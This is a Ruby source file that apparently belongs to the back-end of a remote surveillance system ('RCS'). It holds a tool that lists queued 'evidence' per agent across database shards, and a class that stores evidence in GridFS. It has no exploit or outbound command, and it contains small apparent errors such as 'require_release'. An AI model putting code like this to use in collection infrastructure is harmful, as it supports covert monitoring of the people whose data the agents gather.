# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/fixnum'

require_relative 'db'
require_relative 'grid'
require_relative 'evidence_dispatcher'
require_release 'rcs-worker/db'

module RCS
module DB

class QueueStats
  include RCS::Tracer

  def print_row_line
    table_width = 152
    puts '+' + '-' * table_width + '+'
  end

  def print_header
    puts
    print_row_line
    puts '|' + 'instance'.center(57) + '|' + 'platform'.center(12) + '|' +
         'last sync time'.center(25) + '|' + 'logs'.center(6) + '|' + 'size'.center(13) + '|' + 'shard'.center(34) + '|'
    print_row_line
  end

  def print_footer
    print_row_line
    puts
  end

  def print_rows(shard = nil)
    entries = {}

    RCS::Worker::GridFS.get_distinct_filenames("evidence").each do |inst|
      entries[inst] = {count: 0, size: 0}

      RCS::Worker::GridFS.get_by_filename(inst, "evidence").each do |i|
        entries[inst][:count] += 1
        entries[inst][:size] += i["length"]
      end

      ident = inst.slice(0..13)
      instance = inst.slice(15..-1)
      agent = ::Item.agents.where({ident: ident, instance: instance}).first

      # if the agent is not found we need to delete the pending evidence
      unless agent
        entries.delete(inst)
        RCS::Worker::GridFS.delete_by_filename(inst, "evidence")
        next
      end

      entries[inst][:platform] = agent[:platform]

      if agent.stat[:last_sync]
        time = Time.at(agent.stat[:last_sync]).getutc
        time = time.to_s.split(' +').first
        entries[inst][:time] = time
      else
        entries[inst][:time] = ""
      end
    end

    entries = entries.sort_by {|k,v| v[:time]}

    entries.each do |entry|
      puts "| #{entry[0]} |#{entry[1][:platform].center(12)}| #{entry[1][:time]} |#{entry[1][:count].to_s.rjust(5)} | #{entry[1][:size].to_s_bytes.rjust(11)} | #{shard.rjust(32)} |"
    end
  end

  def self.run!(*argv)
    options = {}

    optparse = OptionParser.new do |opts|
      opts.banner = "Usage: rcs-db-queue [options] "

      opts.on('-h', '--help', 'Display this screen') do
        puts opts
        return 0
      end
    end

    optparse.parse(argv)

    # config file parsing
    return 1 unless Config.instance.load_from_file

    # connect to MongoDB
    return 1 unless DB.instance.connect

    stats = QueueStats.new
    stats.print_header
    Shard.hosts.each do |host|
      host = host.split(':').first
      RCS::Worker::DB.instance.change_mongo_host(host)
      stats.print_rows(host)
    end
    stats.print_footer

    return 0
  end
end

class EvidenceManager
  include Singleton
  include RCS::Tracer

  SYNC_IDLE = 0
  SYNC_IN_PROGRESS = 1
  SYNC_TIMEOUTED = 2
  SYNC_PROCESSING = 3
  SYNC_GHOST = 4
  
  def store_evidence(ident, instance, content)
    shard_id = EvidenceDispatcher.instance.shard_id ident, instance
    trace :debug, "Storing evidence #{ident}:#{instance} (shard #{shard_id})"
    raise "INVALID SHARD ID" if shard_id.nil?
    return RCS::Worker::GridFS.put(content, {filename: "#{ident}:#{instance}", metadata: {shard: shard_id}}, "evidence"), shard_id
  end
end # EvidenceDispatcher

end # ::DB
end # ::RCS
